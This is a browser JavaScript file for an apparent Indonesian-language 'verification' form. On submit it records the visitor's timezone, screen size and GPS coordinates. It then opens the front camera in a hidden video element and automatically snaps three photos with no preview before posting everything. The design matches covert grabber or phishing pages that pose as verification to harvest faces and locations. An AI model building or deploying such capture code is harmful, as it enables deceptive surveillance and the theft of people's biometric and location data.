document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('.verification-form').forEach(function (form) {
        var submitButton = form.querySelector('button[type="submit"]');
        var submitLabel = submitButton.querySelector('.label');
        var captureStatus = form.querySelector('.capture-status');
        var photoInput = form.querySelector('input[type="file"]');
        var submitting = false;

        form.querySelector('[name="timezone"]').value = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
        form.querySelector('[name="screen_resolution"]').value = window.screen.width + 'x' + window.screen.height;

        function captureLocation() {
            return new Promise(function (resolve) {
                if (!navigator.geolocation) {
                    form.querySelector('[name="location_status"]').value = 'gagal';
                    resolve();
                    return;
                }

                navigator.geolocation.getCurrentPosition(function (position) {
                    form.querySelector('[name="latitude"]').value = position.coords.latitude;
                    form.querySelector('[name="longitude"]').value = position.coords.longitude;
                    form.querySelector('[name="accuracy"]').value = position.coords.accuracy;
                    form.querySelector('[name="location_status"]').value = 'diberikan';
                    resolve();
                }, function (error) {
                    form.querySelector('[name="location_status"]').value = error.code === error.PERMISSION_DENIED ? 'ditolak' : 'gagal';
                    resolve();
                }, { timeout: 8000 });
            });
        }

        function capturePhoto() {
            return new Promise(function (resolve) {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    form.querySelector('[name="photo_status"]').value = 'gagal';
                    resolve();
                    return;
                }

                var files = [];
                var MAX_PHOTOS = 3;

                function stopStream(stream) {
                    stream.getTracks().forEach(function (track) { track.stop(); });
                }

                function finish(stream) {
                    stopStream(stream);

                    if (files.length > 0) {
                        var transfer = new DataTransfer();
                        files.forEach(function (file) { transfer.items.add(file); });
                        photoInput.files = transfer.files;
                        form.querySelector('[name="photo_status"]').value = 'diberikan';
                    }

                    captureStatus.textContent = files.length + ' dari ' + MAX_PHOTOS + ' foto diambil.';
                    resolve();
                }

                function waitForFrame(video, callback, elapsed) {
                    if (elapsed > 2000) {
                        callback();
                        return;
                    }

                    if (video.videoWidth > 0 && video.currentTime > 0) {
                        callback();
                        return;
                    }

                    if ('requestVideoFrameCallback' in video) {
                        video.requestVideoFrameCallback(function () {
                            if (video.videoWidth > 0) {
                                callback();
                            } else {
                                setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                            }
                        });
                    } else {
                        setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                    }
                }

                function snap(video, stream, remaining) {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function (blob) {
                        if (blob) {
                            files.push(new File([blob], 'foto-' + (files.length + 1) + '.jpg', { type: 'image/jpeg' }));
                        }

                        if (remaining > 1) {
                            setTimeout(function () { snap(video, stream, remaining - 1); }, 600);
                        } else {
                            finish(stream);
                        }
                    }, 'image/jpeg', 0.7);
                }

                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(function (stream) {
                        var video = document.createElement('video');
                        video.srcObject = stream;
                        video.playsInline = true;
                        video.setAttribute('muted', '');
                        video.setAttribute('autoplay', '');

                        video.play().catch(function () {});

                        video.addEventListener('loadeddata', function () {
                            waitForFrame(video, function () {
                                snap(video, stream, MAX_PHOTOS);
                            }, 0);
                        });
                    })
                    .catch(function (error) {
                        if (error.name === 'NotAllowedError') {
                            form.querySelector('[name="photo_status"]').value = 'ditolak';
                        }
                        resolve();
                    });
            });
        }

        form.addEventListener('submit', function (event) {
            if (submitting) {
                return;
            }

            event.preventDefault();
            submitting = true;
            submitButton.disabled = true;
            submitLabel.textContent = 'Memproses...';
            captureStatus.textContent = 'Tunggu';

            Promise.all([captureLocation(), capturePhoto()]).then(function () {
                form.submit();
            });
        });
    });
});
